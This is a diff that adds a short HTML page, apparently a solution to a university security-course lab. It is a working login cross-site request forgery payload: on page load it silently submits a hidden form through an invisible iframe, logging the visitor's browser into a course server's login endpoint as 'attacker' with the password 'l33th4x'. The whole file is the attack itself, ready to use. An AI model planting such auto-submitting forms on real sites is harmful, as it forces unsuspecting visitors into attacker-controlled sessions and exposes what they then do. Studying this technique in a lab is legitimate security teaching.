@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<body onload="document.forms[0].submit()">
+<iframe name="dummyframe" id="dummyframe" style="display: none;"></iframe>
+
+<form action="https://capp30350.cs.uchicago.edu/login?csrfdefense=0&xssdefense=4" target="dummyframe" method="POST">
+
+	<input type="hidden" name="username" value="attacker"/>
+	<input type="hidden" name="password" value="l33th4x"/>
+</form>
+</body>
+</html>
